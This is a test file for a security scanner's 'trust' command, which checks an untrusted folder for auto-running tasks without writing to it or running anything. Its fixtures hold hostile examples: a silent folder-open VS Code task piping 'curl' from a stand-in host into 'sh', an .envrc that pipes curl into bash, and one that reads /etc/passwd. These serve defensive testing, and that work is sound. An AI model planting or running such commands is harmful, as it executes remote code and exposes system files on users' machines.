/**
 * Ship Safe — `ship-safe trust` command
 * ======================================
 *
 * The pre-flight check that answers "is it safe to point an agent at this
 * folder?" (issue #203).
 *
 * What these tests are really protecting is the command's promise: it reads
 * configuration, writes nothing, and touches no network. A regression that
 * turned it into a scan would make it unsafe to run on the untrusted folder it
 * exists to inspect, so the no-writes property is asserted directly.
 *
 * Run: node --test cli/__tests__/trust-command.test.js
 */

import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import path from 'path';
import os from 'os';

import { trustCommand } from '../commands/trust.js';

let dir;
let written;
let originalWrite;

beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'shipsafe-trustcmd-'));
  written = '';
  originalWrite = process.stdout.write;
  process.stdout.write = (chunk) => { written += chunk; return true; };
});

afterEach(() => {
  process.stdout.write = originalWrite;
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* */ }
  process.exitCode = 0;
});

function write(rel, contents) {
  const file = path.join(dir, rel);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, contents);
}

function hostileTask() {
  write('.vscode/tasks.json', JSON.stringify({
    tasks: [{
      label: 'restore',
      command: 'curl -s https://example.invalid/p | sh',
      runOptions: { runOn: 'folderOpen' },
      presentation: { reveal: 'silent' },
    }],
  }, null, 2));
}

/** Every file in a tree, with its mtime, for the no-writes assertion. */
function snapshot(root) {
  const seen = {};
  const walk = (d) => {
    for (const entry of fs.readdirSync(d, { withFileTypes: true })) {
      const full = path.join(d, entry.name);
      if (entry.isDirectory()) { walk(full); continue; }
      seen[full] = fs.statSync(full).mtimeMs;
    }
  };
  walk(root);
  return seen;
}

describe('ship-safe trust — exit codes', () => {
  it('exits 1 when a sink is found', async () => {
    hostileTask();
    await trustCommand(dir, {});
    assert.equal(process.exitCode, 1);
  });

  it('exits 0 on a folder with nothing to run', async () => {
    write('README.md', '# hello\n');
    await trustCommand(dir, {});
    assert.equal(process.exitCode, 0);
  });

  it('exits 2 when the path does not exist', async () => {
    await trustCommand(path.join(dir, 'missing'), { json: true });
    assert.equal(process.exitCode, 2);
  });

  it('exits 2 when the path is a file rather than a folder', async () => {
    write('a.txt', 'x');
    await trustCommand(path.join(dir, 'a.txt'), { json: true });
    assert.equal(process.exitCode, 2);
  });
});

describe('ship-safe trust — JSON output', () => {
  it('reports the findings and a verdict', async () => {
    hostileTask();
    await trustCommand(dir, { json: true });

    const report = JSON.parse(written);
    assert.equal(report.command, 'trust');
    assert.equal(report.summary.verdict, 'sinks-found');
    assert.equal(report.summary.total, 1);
    assert.equal(report.findings[0].rule, 'WORKSPACE_TASK_AUTORUN');
    assert.equal(report.findings[0].severity, 'critical');
    assert.equal(report.findings[0].file, '.vscode/tasks.json', 'paths are relative to the scanned folder');
  });

  it('carries the advisory table version and age', async () => {
    hostileTask();
    await trustCommand(dir, { json: true });

    const report = JSON.parse(written);
    assert.ok(report.advisoryTable.version, 'a reachability verdict is only as good as the table behind it');
    assert.equal(typeof report.advisoryTable.entries, 'number');
    assert.ok(report.advisoryTable.ageDays >= 0, 'the reader has to be able to see how stale it is');
  });

  it('gives every finding a reachability state', async () => {
    hostileTask();
    await trustCommand(dir, { json: true });

    const finding = JSON.parse(written).findings[0];
    assert.ok(['configured', 'unresolved', 'reachable'].includes(finding.reachability));
    assert.ok(finding.reachabilityReason, 'the state has to say why');
  });

  it('says what it checked even when it found nothing', async () => {
    write('README.md', '# hello\n');
    await trustCommand(dir, { json: true });

    const report = JSON.parse(written);
    assert.equal(report.summary.verdict, 'no-sinks-found');
    assert.ok(report.checked.length > 0, '"we looked and found nothing" must be distinguishable from "we did not look"');
    assert.ok(report.checked.includes('.envrc'));
  });

  it('reports an unreadable path as an error rather than a clean folder', async () => {
    await trustCommand(path.join(dir, 'missing'), { json: true });

    const report = JSON.parse(written);
    assert.ok(report.error, 'a path that could not be read is not a folder with no sinks');
    assert.equal(report.summary, undefined);
  });

  it('orders findings by severity', async () => {
    hostileTask();
    write('.envrc', 'export TOKEN=$(cat /etc/passwd)\n');
    await trustCommand(dir, { json: true });

    const severities = JSON.parse(written).findings.map((f) => f.severity);
    assert.deepEqual(severities, ['critical', 'medium']);
  });
});

describe('ship-safe trust — safety of the command itself', () => {
  it('writes nothing to the folder it inspects', async () => {
    hostileTask();
    write('.envrc', 'curl https://example.invalid | bash\n');
    write('.devcontainer/devcontainer.json', JSON.stringify({ initializeCommand: './x.sh' }));

    const before = snapshot(dir);
    await trustCommand(dir, { json: true });
    const after = snapshot(dir);

    assert.deepEqual(after, before,
      'trust runs against folders nobody trusts yet; it must not modify one');
  });

  it('does not execute what it finds', async () => {
    // The canary: if the command ever ran a discovered task, this file appears.
    const canary = path.join(dir, 'executed');
    write('.vscode/tasks.json', JSON.stringify({
      tasks: [{
        label: 'x',
        command: `touch ${canary}`,
        runOptions: { runOn: 'folderOpen' },
      }],
    }));

    await trustCommand(dir, { json: true });

    assert.equal(fs.existsSync(canary), false, 'reporting a command must never run it');
  });
});
